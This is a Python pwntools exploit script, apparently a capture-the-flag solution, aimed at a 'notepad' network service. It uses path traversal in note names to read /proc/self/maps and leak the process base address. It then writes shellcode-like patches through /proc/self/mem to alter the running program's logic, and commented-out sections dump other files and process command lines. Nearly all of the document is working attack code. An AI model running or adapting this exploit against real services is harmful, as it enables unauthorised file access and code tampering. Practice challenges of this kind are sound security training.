import sys
from pwn import *
from create_port import create_port
context.arch = 'amd64'
if len(sys.argv) < 2:
    port = create_port()
else:
    port = int(sys.argv[1])

r = remote('10.113.184.121', port)
#r = process(['release/share/notepad'])
user = b'admin'
password = b'password'

def register(user, password):
    r.recvuntil(b'> ')
    r.sendline(b'2')
    r.recvuntil(b'Username: ')
    r.sendline(user)
    r.recvuntil(b'Password: ')
    r.sendline(password)

def login(user, password):
    rvalue = r.recvuntil(b'> ')
    print(rvalue)
    r.sendline(b'1')
    r.recvuntil(b'Username: ')
    r.sendline(user)
    r.recvuntil(b'Password: ')
    r.sendline(password)

register(user, password)
login(user, password)

islogin = r.recvuntil(b'!')

if islogin == b'Login failed!':
    print("Login failed!")
    exit(0)

notepad_name = '../../../../../home/notepad/notepad'
maps_name ='../../../../../proc/self/maps'
mem_name = '../../../../../proc/self/mem'

backend_name = '../../../../home/notepad/backend_4050c20b6ca4118b63acd960cd1b9cd8'
run_name = '../../../../../home/notepad/run.sh'

def show_notepad(notepad_name, offset=0):
    if len(notepad_name) % 2 == 0:
        notepad_name = '../' + notepad_name
    notepad_name = './' * ((107 - len(notepad_name)) // 2) + notepad_name
    notepad_name = notepad_name.encode()
    rvalue = r.recvuntil(b'> ')
    print(rvalue.decode())
    r.sendline(b'5')
    r.recvuntil(b'Note Name: ')
    r.sendline(notepad_name)
    r.recvuntil(b'Offset: ')
    r.sendline(str(offset).encode())
'''
for pid in range(1, 50):
    notepad_name = '../../../../../proc/' + str(pid) +'/cmdline'
    show_notepad(notepad_name)
    rvalue = r.recvuntil(b'+')
    print(rvalue.decode())
'''

'''
run = b''
off = 0
while True:
    show_notepad(backend_name, off)
    rvalue = r.recv()
    run += rvalue
    with open('backend_name', 'wb') as f:
        f.seek(off)
        f.write(rvalue)
    off = len(run)
    print(off)
    if off >= 21568:
        break
    print(off)

show_notepad(backend_name, 0)
rvalue = r.recv()
print(rvalue)
print(run[:32])
with open('backend', 'wb') as f:
    f.write(run)
rvalue = r.recvuntil(b'> ')
print(rvalue)
r.close()
'''

maps_data_tmp = b''
maps_data = b''
for i in range(20):
    maps_data_tmp = r.recvuntil(b'+')[:-1]
    maps_data += maps_data_tmp
    
    show_notepad(maps_name, i * 128)

maps_data_tmp = r.recvuntil(b'+')
maps_data += maps_data_tmp
maps_data = maps_data.decode().split('\n')[1].split('-')[0]
base = int(maps_data,16)
print("base: ", hex(base)) 

def editnote(notepad_name, offset, code):
    rvalue = r.recvuntil(b'> ')
    print(rvalue)
    r.sendline(b'4')

    if len(notepad_name) % 2 == 0:
        notepad_name = '../' + notepad_name
    notepad_name = './' * ((107 - len(notepad_name)) // 2) + notepad_name
    notepad_name = notepad_name.encode()

    r.recvuntil(b'Note Name: ')
    r.sendline(notepad_name)
    r.recvuntil(b'Offset: ')
    r.sendline(str(offset).encode())
    r.recvuntil(b'Content Length: ')
    r.sendline(str(len(code)).encode())
    r.recvuntil(b'Content: ')
    r.send(code)

offset = 0x1606
code = b'\xc7\x85\x40\xfe\xff\xff\x87\x87\x00\x00'

editnote(mem_name, base+offset, code)

offset = 0x16f4
code = asm('''
lea    rax,[rbp-0x108]
''')

#code = b'\x48\x8d\x8d\x40\xfe\xff\xff\x8b\x01\x00\x00\x00\xba\xa4\x00\x00\x00\x48\x89\xce\x89\xc7\xe8\x6c\xfb\xff\xff\xc9\xc3'
editnote(mem_name, base+offset, code)

login(b"123", password)


r.interactive()
    